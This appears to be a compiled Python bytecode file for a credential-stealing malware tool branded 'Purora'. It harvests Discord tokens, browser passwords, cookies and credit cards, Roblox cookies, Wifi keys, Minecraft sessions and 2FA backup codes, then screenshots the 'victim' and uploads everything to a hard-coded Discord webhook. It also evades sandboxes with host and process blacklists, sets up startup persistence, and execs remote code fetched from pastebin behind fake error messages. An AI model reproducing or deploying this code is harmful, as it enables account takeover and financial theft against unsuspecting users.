U
    �Q�cW�  �                   @   sD  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlmZ d dlmZmZmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlmZmZ d d	lm Z m!Z! d dl"Z"d d
l"m#Z# e$e#j%� d�� dZ&dZ'dZ(dZ)dZ*dZ+e,d�dd�Z-e,d�dd�Z.dd� Z/dd� Z0dd� Z1e� fe,�p`ej2d�dd�Z3G d d!� d!�Z4e/G d"d#� d#��Z5e/G d$d%� d%��Z6e/G d&d'� d'��Z7e/G d(d)� d)��Z8e/G d*d+� d+��Z9d,d-� Z:G d.d/� d/�Z;e<d0k�rej=d1k�re.e&� e>e�?d2�j@� e�Ad3� e$e#jB� d4�� eCeD� d5�� dS )6�    N)�AES)�Embed�File�SyncWebhook)�	ImageGrab)�CryptUnprotectData)�copy2)�argv)�
gettempdir�mkdtemp)�ZIP_DEFLATED�ZipFile)�Forez
Verifying key...zyhttps://discord.com/api/webhooks/1057716600708550757/yYRwlUa0NneeS929cQp3ZEJj16lzKjOZkibeIY9rDpLS_N8zZJPGktMOHdeqsvmcJTw2z%ping_enabled%z%ping_type%z%_error_enabled%z%_startup_enabled%z%_defender_enabled%)�webhookc              	   C   s�   t j| t�� d�} ttttg}t|� |D ]}t	j
|dd�}|��  q*t	�� D ]*}z|��  W qN tk
rv   Y qNY qNX qNt�  d }tt� dt�� � d��}d}tr�tdkr�|d7 }ntd	kr�|d
7 }| j||ddd� t�  t�  d S )N��sessionT)�target�daemon�\�.zip� Zeveryonez	@everyone�herez@here�ahttps://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096�Purora)�content�file�
avatar_url�username)r   �from_url�requests�Session�Browsers�Wifi�	Minecraft�BackupCodes�configcheck�	threading�Thread�start�	enumerate�join�RuntimeError�zipupr   �localappdata�os�getlogin�__PING__�__PINGTYPE__�send�PcInfo�Discord)r   �threads�funcZprocess�t�_filer   � r9   �
neptune.py�main.   s.    

r;   c                 C   s"   t �  tg}|D ]}|| � qd S �N)�Debugr;   )r   Zprocs�procr9   r9   r:   �programO   s    r?   c                    s   � fdd�}|S )Nc                     s(   z� | |� W n t k
r"   Y nX d S r<   )�	Exception)�args�kwargs�r6   r9   r:   �wrapperX   s    ztry_extract.<locals>.wrapperr9   )r6   rD   r9   rC   r:   �try_extractW   s    rE   c                 C   s.   t s| �t� ts| �t� ts*| �t� d S r<   )�	__ERROR__�removeZ	fakeerror�__STARTUP__�startup�__DEFENDER__Zdisable_defender)�listr9   r9   r:   r%   `   s    

r%   c                  C   sV   t �d�d } t j�| td  �rDt �| td  � ttd | � nttd | � d S )N�appdataz/\Microsoft\Windows\Start Menu\Programs\Startup\r   )r.   �getenv�path�existsr	   rG   r   )Zstartup_pathr9   r9   r:   rI   h   s
    rI   )�_dirc                 C   s<   d� dd� tt�dd��D ��}tj� | |�}t|d� |S )Nr   c                 s   s   | ]}t �� �d �V  qdS )Z>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789N)�random�SystemRandom�choice)�.0�_r9   r9   r:   �	<genexpr>q   s     zcreate_temp.<locals>.<genexpr>�
   �   �x)r*   �rangerQ   �randintr.   rN   �open)rP   �	file_namerN   r9   r9   r:   �create_tempp   s     
r^   c                   @   s   e Zd Zdd� Zdd� ZdS )r3   c                 C   s   | � t� d S r<   )�get_inf�__HOOK__��selfr9   r9   r:   �__init__x   s    zPcInfo.__init__c                 C   s�   t j|t�� d�}tddd�}t�� }t�� �� d }t�� �	� d }t
tt�� �� d j�d d�}|jddt� d	t� d
|� dt� dt� dt� d|j� d|j� d|� d�dd� |jdd� |jdd� |j|ddd� d S )Nr   r   �"-� ��title�colorr   i   zSystem Infoz **PC Username:** `z`
 **PC Name:** `z`
 **OS:** `z`

 **IP:** `z`
 **MAC:** `z`
 **HWID:** `z`

 **CPU:** `z`
 **GPU:** `z`
 **RAM:** `zGB`F��name�valueZinline�-https://github.com/Purora (FOR MORE SOFTWARE))�textr   ��url��embedr   r   )r   r   r   r    r   �platform�wmiZWMIZWin32_ProcessorZWin32_VideoController�round�floatZWin32_OperatingSystemZTotalVisibleMemorySize�	add_fieldr   �hostname�ip�mac�hwid�NameZ
set_footer�set_thumbnailr2   )rb   r   rp   Zcomputer_osZcpuZgpuZramr9   r9   r:   r_   {   s     >�zPcInfo.get_infN)�__name__�
__module__�__qualname__rc   r_   r9   r9   r9   r:   r3   w   s   r3   c                   @   s4   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� ZdS )r4   c                 C   sR   d| _ t�d�| _t�d�| _d| _d| _g | _g | _g | _	| �
�  | �t� d S )Nz$https://discord.com/api/v9/users/@mer-   rL   z"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}zdQw4w9WgXcQ:[^\"]*)�baseurlr.   rM   rL   �roaming�regex�encrypted_regex�tokens_sent�tokens�ids�
grabTokens�uploadr`   ra   r9   r9   r:   rc   �   s    zDiscord.__init__c                 C   sd   zH|dd� }|dd � }t �|t j|�}|�|�}|d d� �� }|W S  tk
r^   Y dS X d S )N�   �   �����zFailed to decrypt password)r   �new�MODE_GCM�decrypt�decoder@   �rb   �buff�
master_keyZivZpayloadZcipherZdecrypted_passr9   r9   r:   �decrypt_val�   s    
zDiscord.decrypt_valc              	   C   sb   t |ddd��}|�� }W 5 Q R X t�|�}t�|d d �}|dd � }t|d d d d�d }|S �	N�r�utf-8��encodingZos_cryptZencrypted_key�   r   �   �r\   �read�json�loads�base64�	b64decoder   �rb   rN   �f�cZlocal_stater�   r9   r9   r:   �get_master_key�   s    
zDiscord.get_master_keyc                 C   s>  | j d | j d | j d | j d | j d | j d | jd | jd | jd	 | jd
 | jd | jd | jd | jd | jd | jd | jd | jd | jd | jd | jd | jd | jd | jd | jd | jd | jd d�}|�� D �]P\}}tj�|�s�q�|�dd��� }d|k�r^tj�| j d |� d!� ��r8t�|�D �]}|d"d � d#k�rZ�q>d$d%� t	|� d |� �d&d'��
� D �D ]�}t�| j|�D ]�}z4| �t�|�d(�d) �| �| j d |� d!� ��}W n tk
�r�   Y nX ztj| jd*d+|d,�d-�}	W n tk
�r   Y nX |	jd.k�r�|	�� d/ }
|
| jk�r�| j�|� | j�|
� �q��q~�q>q�t�|�D ]�}|d"d � d#k�r��qhd0d%� t	|� d |� �d&d'��
� D �D ]�}t�| j|�D ]v}ztj| jd*d+|d,�d-�}	W n tk
�r�   Y nX |	jd.k�r�|	�� d/ }
|
| jk�r�| j�|� | j�|
� �q��q��qhq�tj�| j d1 ��r:t�| j d1 �D ]�\}}}|D ]�}|�d2��s��qld3d%� t	|� d |� �d&d'��
� D �D ]�}t�| j|�D ]v}ztj| jd*d+|d,�d-�}	W n tk
�r�   Y nX |	jd.k�r�|	�� d/ }
|
| jk�r�| j�|� | j�|
� �q��q��ql�q^d S )4Nz\discord\Local Storage\leveldb\z%\discordcanary\Local Storage\leveldb\z!\Lightcord\Local Storage\leveldb\z"\discordptb\Local Storage\leveldb\z3\Opera Software\Opera Stable\Local Storage\leveldb\z6\Opera Software\Opera GX Stable\Local Storage\leveldb\z'\Amigo\User Data\Local Storage\leveldb\z'\Torch\User Data\Local Storage\leveldb\z(\Kometa\User Data\Local Storage\leveldb\z)\Orbitum\User Data\Local Storage\leveldb\z-\CentBrowser\User Data\Local Storage\leveldb\z-\7Star\7Star\User Data\Local Storage\leveldb\z1\Sputnik\Sputnik\User Data\Local Storage\leveldb\z1\Vivaldi\User Data\Default\Local Storage\leveldb\z3\Google\Chrome SxS\User Data\Local Storage\leveldb\z7\Google\Chrome\User Data\Default\Local Storage\leveldb\z9\Google\Chrome\User Data\Profile 1\Local Storage\leveldb\z9\Google\Chrome\User Data\Profile 2\Local Storage\leveldb\z9\Google\Chrome\User Data\Profile 3\Local Storage\leveldb\z9\Google\Chrome\User Data\Profile 4\Local Storage\leveldb\z9\Google\Chrome\User Data\Profile 5\Local Storage\leveldb\z6\Epic Privacy Browser\User Data\Local Storage\leveldb\z7\Microsoft\Edge\User Data\Defaul\Local Storage\leveldb\z8\uCozMedia\Uran\User Data\Default\Local Storage\leveldb\z>\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb\zE\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb\z1\Iridium\User Data\Default\Local Storage\leveldb\)r4   zDiscord CanaryZ	LightcordzDiscord PTBZOperazOpera GXZAmigoZTorchZKometaZOrbitumZCentBrowserZ7StarZSputnikZVivaldiz
Chrome SxSZChromeZChrome1ZChrome2ZChrome3ZChrome4ZChrome5zEpic Privacy BrowserzMicrosoft EdgeZUranZYandexZBraveZIridium� r   Zcordr   �\Local State�����)�logZldbc                 S   s   g | ]}|� � r|� � �qS r9   ��strip�rT   rY   r9   r9   r:   �
<listcomp>�   s      z&Discord.grabTokens.<locals>.<listcomp>�ignore)�errorszdQw4w9WgXcQ:r�   �sMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36�application/json�z
User-AgentzContent-TypeZAuthorization��headers��   �idc                 S   s   g | ]}|� � r|� � �qS r9   r�   r�   r9   r9   r:   r�   �   s      z\Mozilla\Firefox\Profilesz.sqlitec                 S   s   g | ]}|� � r|� � �qS r9   r�   r�   r9   r9   r:   r�     s      ) r�   rL   �itemsr.   rN   rO   �replace�lower�listdirr\   �	readlines�re�findallr�   r�   r�   r�   �splitr�   �
ValueErrorr   �getr   r@   �status_coder�   r�   r�   �appendr�   �walk�endswith)rb   �pathsri   rN   Zdiscr]   �line�y�tokenr�   �uidrU   �filesr8   r9   r9   r:   r�   �   s�    �
(4�(�(�zDiscord.grabTokensc                 C   s�  t j|t�� d�}| jD �]L}|| jkr(g }d}d}dd|d�}tj| j|d��� }tjd|d��� }tjd	|d�}	|d
 d |d  }
|d }t�d|� d|d � d��j	dkr�d|� d|d � d�nd|� d|d � d�}|d }|d }z|d r�d}nd}W n t
k
�r   d}Y nX z>|d dk�r6d}n&|d dk�rJd}n|d dk�r\d}W n tk
�rx   |}Y nX |g k�r�d}nld}zH|D ]>}|d dk�r�|d 7 }n |d dk�r�|d!7 }n|d"7 }�q�W n tk
�r�   |d"7 }Y nX |d#|� d$|� d%|� d&|� d'|� d(|� d)|� d*�7 }d+|	jk�r�t�|	j�}z*|D ] }|�|d+ |d, d- f� �qHW n tk
�r�   Y nX |g k�r�|d.7 }n�t|�dk�r�d/}|D ]>\}}|d7 }|dk�r� �q|d0|� d1|� d2|� d3�7 }�q�n,|D ]&\}}|d0|� d1|� d2|� d3�7 }�q�t|
d4d5�}|jd6|d7 d8d9� |j|d:� |j|d;d<d=� |  j|7  _qtjd d>d8d d?�}|�td@ � tdAd4d5�}ttd@ dBdC�}|jdDd:� |j||d<dE� t�|� d S )FNr   r   Znoner�   r�   r�   r�   z<https://discord.com/api/v6/users/@me/billing/payment-sourcesz>https://discord.com/api/v9/users/@me/outbound-promotions/codesr   �#Zdiscriminatorr�   z#https://cdn.discordapp.com/avatars/�/�avatarz.gifr�   z.png�phone�emailZmfa_enabled�trueZpremium_typer�   zNitro Classic�   ZNitror�   zNitro Basic�typezCREDIT CARDzPAYPAL ACCOUNTzFOUND UNKNOWN METHONDz **Discord ID:** `z` 
 **Email:** `z`
 **Phone:** `z`

 **2FA:** `z`
 **Nitro:** `z`
 **Billing:** `z`

 **Token:** `z`
�codeZ	promotionZoutbound_titlez
**No Gift Cards Found**
r   z
 `z:`
**z**
[Click to copy!](z)
rd   re   zb.                                                    Discord Info                                .u   ​Frh   rm   r   r   ro   T)ZbboxZall_screensZinclude_layered_windowsZxdisplayz
\image.pngzVictim point of viewz	image.png)�filenamezattachment://image.png)rp   r   r   )r   r   r   r    r�   r�   r�   r   r�   r�   r@   �BaseException�	TypeErrorrl   r�   r�   �lenr   ru   r{   r2   r   ZgrabZsave�
tempfolderr   Z	set_imager.   �close)rb   r   r�   Z	val_codes�valZnitror�   r�   �b�gr   Z
discord_idr�   r�   r�   Zmfa�methods�methodZcodesr�   Znumr�   r7   rp   ZimageZembed2r   r9   r9   r:   r�     s�    
����




4"


" ���zDiscord.uploadN)r|   r}   r~   rc   r�   r�   r�   r�   r9   r9   r9   r:   r4   �   s
   	`r4   c                   @   s�   e Zd Zdd� Zeed�dd�Zeeed�dd�Zeeed	�d
d�Zeeed	�dd�Z	eeed	�dd�Z
eeed	�dd�Zdd� ZdS )r!   c                 C   sr  t �d�| _t �d�| _| jd | jd | jd | jd | jd | jd | jd	 | jd
 | jd | jd | jd | jd | jd | jd | jd | jd d�| _ddddddg| _t jt j�t	d�dd� t jt j�t	d�dd� | j�
� D ]x\}}t j�|��sq�| �|d �| _| j| j| j| jg| _| jD ]2}| jD ]$}z||||� W n   Y nX �q:�q0q�| ��  d S )N�LOCALAPPDATA�APPDATAz\Amigo\User Dataz\Torch\User Dataz\Kometa\User Dataz\Orbitum\User Dataz\CentBrowser\User Dataz\7Star\7Star\User Dataz\Sputnik\Sputnik\User Dataz\Vivaldi\User Dataz\Google\Chrome SxS\User Dataz\Google\Chrome\User Dataz\Epic Privacy Browser\User Dataz\Microsoft\Edge\User Dataz\uCozMedia\Uran\User Dataz\Yandex\YandexBrowser\User Dataz&\BraveSoftware\Brave-Browser\User Dataz\Iridium\User Data)ZamigoZtorchZkometaZorbitumzcent-browserZ7starZsputnikZvivaldizgoogle-chrome-sxszgoogle-chromezepic-privacy-browserzmicrosoft-edgeZuranZyandexZbraveZiridiumZDefaultz	Profile 1z	Profile 2z	Profile 3z	Profile 4z	Profile 5�BrowserT��exist_ok�Robloxr�   )r.   rM   rL   r�   ZbrowsersZprofiles�makedirsrN   r*   r�   r�   �isdirr�   �	masterkey�cookies�history�	passwords�credit_cardsZfuncs�roblox_cookies)rb   ri   rN   �profiler6   r9   r9   r:   rc   �  sX    ��	�

zBrowsers.__init__)rN   �returnc              	   C   sb   t |ddd��}|�� }W 5 Q R X t�|�}t�|d d �}|dd � }t|d d d d�d }|S r�   r�   r�   r9   r9   r:   r�   �  s    
zBrowsers.get_master_key)r�   r�   r�   c                 C   sF   |dd� }|dd � }t �|t j|�}|�|�}|d d� �� }|S )Nr�   r�   r�   )r   r�   r�   r�   r�   r�   r9   r9   r:   �decrypt_password�  s    
zBrowsers.decrypt_password)ri   rN   r�   c                 C   s�   |d| d 7 }t j�|�s d S t� }t||� t�|�}|�� }tt j�	t
dd�ddd��X}|�d��� D ]B}|\}	}
}| �|| j�}|	d	krl|�d
|	� d|
� d|� d�� qlW 5 Q R X |��  |��  t �|� d S )Nr   z\Login Datar�   zBrowser Passwords.txt�ar�   r�   z=SELECT origin_url, username_value, password_value FROM loginsr   zURL: z  Username: z  Password: �
)r.   rN   �isfiler^   r   �sqlite3�connect�cursorr\   r*   r�   �execute�fetchallr�   r�   �writer�   rG   )rb   ri   rN   r�   Z
loginvault�connr�   r�   �resrn   r   Zpasswordr9   r9   r:   r�   �  s     


*zBrowsers.passwordsc                 C   s�   |d| d 7 }t j�|�s d S t� }t||� t�|�}|�� }tt j�	t
dd�ddd��|}|�d��� D ]f}|\}	}}}
}| �|
| j�}|	rl|rl|d	krl|�d
�|	|dkr�dnd||	�d�r�dnd|||�� qlW 5 Q R X |��  |��  t �|� d S )Nr   z\Network\Cookiesr�   �Browser Cookies.txtr�   r�   r�   zESELECT host_key, name, path, encrypted_value,expires_utc FROM cookiesr   z{}	{}	{}	{}	{}	{}	{}
r   ZFALSEZTRUE�.)r.   rN   r�   r^   r   r�   r�   r�   r\   r*   r�   r�   r�   r�   r�   r�   �format�
startswithr�   rG   )rb   ri   rN   r�   Zcookievaultr�   r�   r�   r�   Zhost_keyZencrypted_valueZexpires_utcrj   r9   r9   r:   r�   �  s0    

      �zBrowsers.cookiesc              	   C   s  |d| d 7 }t j�|�s d S t� }t||� t�|�}|�� }tt j�	t
dd�ddd���}g }|�d��� D ]6}	|	\}
}}}|
rp|rp|rp|d	krp|�|
|||f� qp|jd
d� dd� |D ]}|�d�|d |d �� q�W 5 Q R X |��  |��  t �|� d S )Nr   z\Historyr�   zBrowser History.txtr�   r�   r�   z9SELECT url, title, visit_count, last_visit_time FROM urlsr   c                 S   s   | d S )Nr�   r9   )rY   r9   r9   r:   �<lambda>�  �    z"Browsers.history.<locals>.<lambda>T)�key�reversez!Visit Count: {:<6} Title: {:<40}
r�   r�   )r.   rN   r�   r^   r   r�   r�   r�   r\   r*   r�   r�   r�   r�   �sortr�   r�   r�   rG   )rb   ri   rN   r�   Zhistoryvaultr�   r�   r�   Zsitesr�   rn   rf   Zvisit_countZlast_visit_timeZsiter9   r9   r:   r�   �  s&    

&zBrowsers.historyc                 C   s�   |d| d 7 }t j�|�s d S t� }t||� t�|�}|�� }tt j�	t
dd�ddd��`}|�d��� D ]J}|\}	}
}}|	rl|d	krl|�d
|	� d|
� d|� d| �|| j�� d�	� qlW 5 Q R X |��  |��  |��  t �|� d S )Nr   z	\Web Datar�   zBrowser Creditcards.txtr�   r�   r�   z_SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cardsr   zName: z   Expiration Month: z   Expiration Year: z   Card Number: r�   )r.   rN   r�   r^   r   r�   r�   r�   r\   r*   r�   r�   r�   r�   r�   r�   r�   rG   )rb   ri   rN   r�   Z	cardvaultr�   r�   r�   r�   Zname_on_cardZexpiration_monthZexpiration_yearZcard_number_encryptedr9   r9   r:   r�     s$    

&�zBrowsers.credit_cardsc              
   C   s�   t tj�tdd�ddd��r}|�t� d�� t tj�tdd�d	dd��4}|D ](}d
|krL|�|�d
�d �� d � qLW 5 Q R X |�	�  W 5 Q R X |�	�  d S )Nr�   zRoblox Cookies.txt�wr�   r�   �

r�   r�   r�   z.ROBLOSECURITYr�   r�   )
r\   r.   rN   r*   r�   r�   �githubr�   r�   r�   )rb   r�   �f2r�   r9   r9   r:   r�     s    (zBrowsers.roblox_cookiesN)r|   r}   r~   rc   �strr�   �bytesr�   r�   r�   r�   r�   r�   r9   r9   r9   r:   r!     s   7	r!   c                   @   s   e Zd Zdd� ZdS )r"   c           
   
   C   s�  g | _ i | _tjtj�td�dd� ttj�tdd�ddd��}|�t	� d�� W 5 Q R X t
�d	��d
�}|D ]d}d|kr�| j �|�d�d dd � � qnttj�tdd�ddd��}|�d� W 5 Q R X |��  qn| j D ]d}t
�d|� d��}d|k�r0|�d�}|d �d
�d }|�d�d }|| j|< q�d}|| j|< q�ttj�tdd�ddd��4}| j�� D ]"\}}	|�d|� d|	� d
�� �qfW 5 Q R X |��  d S )Nr"   Tr�   zWifi Passwords.txtr  r�   r�   z | Wifi Networks & Passwords

znetsh wlan show profilesr�   zAll User Profile�:�����r�   zBThere is no wireless interface on the system. Ethernet using twat.znetsh wlan show profile "z" key=clearzKey Contentr   z: r   zWifi Name : z | Password : )Z	wifi_listZ	name_passr.   r�   rN   r*   r�   r\   r�   r  �
subprocessZ	getoutputr�   r�   r�   r�   )
rb   r�   �datar�   �i�commandZ	split_keyZtmpr�   �jr9   r9   r:   rc   $  s6     


�

&zWifi.__init__N)r|   r}   r~   rc   r9   r9   r9   r:   r"   "  s   r"   c                   @   s$   e Zd Zdd� Zdd� Zdd� ZdS )r#   c                 C   sJ   t �d�| _d| _d| _d| _t jt j�t	d�dd� | �
�  | ��  d S )NrL   z"\.minecraft\launcher_accounts.jsonz\.minecraft\usercache.jsonz)No minecraft accounts or access tokens :(r#   Tr�   )r.   rM   r�   �accounts_path�usercache_path�error_messager�   rN   r*   r�   �session_info�
user_cachera   r9   r9   r:   rc   J  s    zMinecraft.__init__c              
   C   s�   t tj�tdd�ddd��x}|�t� d�� tj�| j| j	 �r�t | j| j	 d��(}t
�|�| _|�t
j| jdd	�� W 5 Q R X n|�| j� W 5 Q R X |��  d S )
Nr#   zSession Info.txtr  �cp437r�   z | Minecraft Session Info

r�   �   ��indent)r\   r.   rN   r*   r�   r�   r  rO   r�   r  r�   �loadr   �dumpsr  r�   �rb   r�   r�   r9   r9   r:   r  T  s    "zMinecraft.session_infoc              
   C   s�   t tj�tdd�ddd��x}|�t� d�� tj�| j| j	 �r�t | j| j	 d��(}t
�|�| _|�t
j| jdd	�� W 5 Q R X n|�| j� W 5 Q R X |��  d S )
Nr#   zUser Cache.txtr  r  r�   r  r�   r  r  )r\   r.   rN   r*   r�   r�   r  rO   r�   r  r�   r  �userr  r  r�   r  r9   r9   r:   r  _  s    "zMinecraft.user_cacheN)r|   r}   r~   rc   r  r  r9   r9   r9   r:   r#   H  s   
r#   c                   @   s   e Zd Zdd� Zdd� ZdS )r$   c                 C   s6   t jd | _d| _t jt j�td�dd� | ��  d S )N�HOMEPATHz#\Downloads\discord_backup_codes.txtr4   Tr�   )r.   �environrN   �	code_pathr�   r*   r�   �	get_codesra   r9   r9   r:   rc   m  s    zBackupCodes.__init__c              
   C   s�   t tj�tdd�dddd��v}|�t� d�� tj�| j| j �r�t | j| j d��(}|�	� D ]}|�
d	�r^|�|� q^W 5 Q R X n
|�d
� W 5 Q R X |��  d S )Nr4   z2FA Backup Codes.txtr  r�   r�   )r�   r�   r  r�   �*zNo discord backup codes found)r\   r.   rN   r*   r�   r�   r  rO   r  r�   r�   r�   )rb   r�   r�   r�   r9   r9   r:   r  t  s    
zBackupCodes.get_codesN)r|   r}   r~   rc   r  r9   r9   r9   r:   r$   k  s   r$   c                  C   s�   t �d�at j�tt �� � d��} t| dt�}t j�t	�}t �
t	�D ]J\}}}|D ]:}t j�t j�||��}|t|�d d � }|�||� qRqD|��  td�dd�}	td�dd	�}
d S )
Nr�   r   r  r�   )�dirc                 S   s�   t �|�D ]�}t�d|�r
|d | d }t j�|�s8q
t �|�D ]F}t�d|�rB|d | d d }t j�|d �sxqB||f    S qBq
d S )N�app-+?r   z\moduleszdiscord_desktop_core-+?Zdiscord_desktop_corez	\index.js)r.   r�   r�   �searchrN   rO   )rb   r!  r   �modulesZcorer9   r9   r:   �get_core�  s    zzipup.<locals>.get_corec                 S   s�   |d }|� d�d d }t�|�D ]p}t�d|�r$|d | }tj�|d d �r$t�|�D ]4}||kr^|d | }tj|d|gdtj	tj	d	� q^q$d S )
Nz\Update.exer   r	  z.exer"  r$  z--processStartT)�shell�stdout�stderr)
r�   r.   r�   r�   r#  rN   rO   r
  Zcall�PIPE)rb   r!  �update�
executabler   Zappr9   r9   r:   �start_discord�  s"    ��zzipup.<locals>.start_discord)r.   rM   r-   rN   r*   r/   r   r   �abspathr�   r�   r�   r�   r�   r  )Z_zipfileZzipped_fileZabs_src�dirnamerU   r�   r�   ZabsnameZarcnamer%  r,  r9   r9   r:   r,   �  s    
r,   c                   @   sZ   e Zd Ze� add� Zdd� Zed�dd�Zed�dd	�Z	ed�d
d�Z
dd�dd�ZdS )r=   c                 C   s   | � � r| ��  d S r<   )�checks�self_destructra   r9   r9   r:   rc   �  s    zDebug.__init__c              <   C   s�  d}dddddddd	d
ddddddddg| _ dddddddddddddd d!d"d#d$d%d&d'd(d)d*d+d,d-d.d/d0d1d2d3d4d5d6g$| _d7d8d9d:d;d<d=g| _d>d?d@dAdBdCdDdEdFdGdHdIdJdKdLdMdNdOdPdQdRdSdTdUdVdWdXdUdYdZd[d\d]d^d_d`dadbdcdddedfdgdhdidjdkdldmdndodpdqdrdsdtdudvdwdxg<| _dydzd{d|d}d~dd�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�g| _d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�td� g| _| ��  | �� �r�d}| �	� �r�d}d S )�NFZ	WDAccountZAbbyZhmarcZpatexZRDhZ	kEecfMwgjZFrankZ5bqZLisaZJohnZgeorgeZ
PxmdUOpVyxZ8MZwAZU1ZtestZRegzBEE7370C-8C0C-4zDESKTOP-NAKFFMTzWIN-5E07COS9ALRzB30F0242-1C6A-4zDESKTOP-VRSQLAGZ
Q9IATRKPRHZXC64ZBzDESKTOP-D019GDMzDESKTOP-WI8CLETZSERVER1zLISA-PCzJOHN-PCzDESKTOP-B0T93D6zDESKTOP-1PYKP29zDESKTOP-1Y2433RZWILEYPCZWORKz6C4E733F-C2D9-4z	RALPHS-PCzDESKTOP-WG3MYJSzDESKTOP-7XC6GEZzDESKTOP-KALVINOZCOMPNAME_4047zDESKTOP-19OLLTDzDESKTOP-DE369SEzEA8C2E2A-D017-4ZAIDANPCzLUCAS-PCzMARCI-PCZACEPCzMIKE-PCzDESKTOP-IAPKN1PzDESKTOP-NTU7VUOz	LOUISE-PCZT00917Ztest42z$7AB5C494-39F5-4941-9163-47F54D6D5016z$03DE0294-0480-05DE-1A06-350700080009z$11111111-2222-3333-4444-555555555555z$6F3CA5EC-BEC9-4A4D-8274-11168F640058z$ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548z$4C4C4544-0050-3710-8058-CAC04F59344Az$921E2042-70D3-F9F1-8CBD-B398A21F89C6z88.132.231.71z78.139.8.50z20.99.160.173z88.153.199.169z84.147.62.12z194.154.78.160z92.211.109.160z195.74.76.222z188.105.91.116z34.105.183.68z92.211.55.199z79.104.209.33z95.25.204.90z34.145.89.174z109.74.154.90z109.145.173.169z34.141.146.114z212.119.227.151z195.239.51.59z192.40.57.234z64.124.12.162z34.142.74.220z188.105.91.173z109.74.154.91z34.105.72.241z109.74.154.92z213.33.142.50z93.216.75.209z192.87.28.103z88.132.226.203z195.181.175.105z88.132.225.100z92.211.192.144z34.83.46.130z188.105.91.143z34.85.243.241z34.141.245.25z178.239.165.70z84.147.54.113z193.128.114.45z95.25.81.24z92.211.52.62z88.132.227.238z35.199.6.13z80.211.0.97z34.85.253.170z23.128.248.46z35.229.69.227z34.138.96.23z192.211.110.74z35.237.47.12z87.166.50.213z34.253.248.228z212.119.227.167z193.225.193.201z34.145.195.58z34.105.0.27z195.239.51.3z35.192.93.107z00:15:5d:00:07:34z00:e0:4c:b8:7a:58z00:0c:29:2c:c1:21z00:25:90:65:39:e4zc8:9f:1d:b6:58:e4z00:25:90:36:65:0cz00:15:5d:00:00:f3z2e:b8:24:4d:f7:dez00:50:56:97:a1:f8z5e:86:e4:3d:0d:f6z00:50:56:b3:ea:eez3e:53:81:b7:01:13z00:50:56:97:ec:f2z00:e0:4c:b3:5a:2az12:f8:87:ab:13:ecz00:50:56:a0:38:06z2e:62:e8:47:14:49z00:0d:3a:d2:4f:1fz60:02:92:66:10:79r   z00:50:56:a0:d7:38zbe:00:e5:c5:0c:e5z00:50:56:a0:59:10z00:50:56:a0:06:8dz00:e0:4c:cb:62:08z4e:81:81:8e:22:4eZhttpdebuggeruiZ	wiresharkZfiddlerZregeditZtaskmgrZvboxserviceZdf5servZprocesshackerZvboxtrayZvmtoolsdZ
vmwaretrayZida64ZollydbgZpestudioZ
vmwareuserZvgauthserviceZvmacthlpZx96dbgZvmsrvcZx32dbgZvmusrvcZprl_ccZ	prl_toolszqemu-gaZjoeboxcontrolZksdumperclientZksdumperZjoeerr   )
�blackListedUsers�blackListedPCNames�blackListedHWIDS�blackListedIPS�blackListedMacsr	   �blacklistedProcesses�check_process�get_network�
get_system)rb   Z	debuggingr9   r9   r:   r/  �  sv                  �                                �    �                                                     �	                      �                          �

zDebug.checks)r�   c              
      sL   t �� D ]>� t� fdd�| jD ��rzW q t jt jfk
rD   Y qX qd S )Nc                 3   s   | ]}|� � � �� kV  qd S r<   )ri   r�   )rT   Zprocstr�r>   r9   r:   rV   �  s     z&Debug.check_process.<locals>.<genexpr>)�psutilZprocess_iter�anyr6  ZNoSuchProcessZAccessDeniedra   r9   r:  r:   r7  �  s    zDebug.check_processc                 C   sJ   t �d�jad�t�ddt��  ��a	da
t| jkr8dS t	| jkrFdS d S )Nzhttps://api.ipify.orgr  z..z%012xrk   F)r   r�   rl   rw   r*   r�   r�   �uuidZgetnoderx   r  r4  r5  ra   r9   r9   r:   r8  �  s    

zDebug.get_networkc                 C   sl   t �d�at �d�atjddtjtjd��d��d�d �	� a
t
| jkrLd	S t| jkrZd	S t| jkrhd	S d S )
NZUserNameZCOMPUTERNAMEz4C:\Windows\System32\wbem\WMIC.exe csproduct get uuidT)r&  �stdinr(  r�   r�   r�   F)r.   rM   r   rv   r
  Zcheck_outputr)  r�   r�   r�   ry   r3  r1  r2  ra   r9   r9   r:   r9  �  s$    

 ����


zDebug.get_systemNc                 C   s   t t� d S r<   )r?   r`   ra   r9   r9   r:   r0  �  s    zDebug.self_destruct)r|   r}   r~   r   r�   rc   r/  �boolr7  r8  r9  r0  r9   r9   r9   r:   r=   �  s   'r=   �__main__�ntz!https://pastebin.com/raw/qbP39b9f�clszNo module named: "Crypto" z press enter to exit )Er�   r�   r.   rq   rQ   r�   r�   r
  r&   r=  �ctypesr;  r   rr   ZCrypto.Cipherr   Zdiscordr   r   r   ZPILr   Z
win32cryptr   �shutilr   �sysr	   Ztempfiler
   r   �zipfiler   r   Zcoloramar   �printZMAGENTAr`   r0   r1   rF   rH   rJ   r  r;   r?   rE   r%   rI   �PathLiker^   r3   r4   r!   r"   r#   r$   r,   r=   r|   ri   �execr�   rl   �systemZRED�inputZ	ForeRESETr9   r9   r9   r:   �<module>   sr   !	 q #%",U
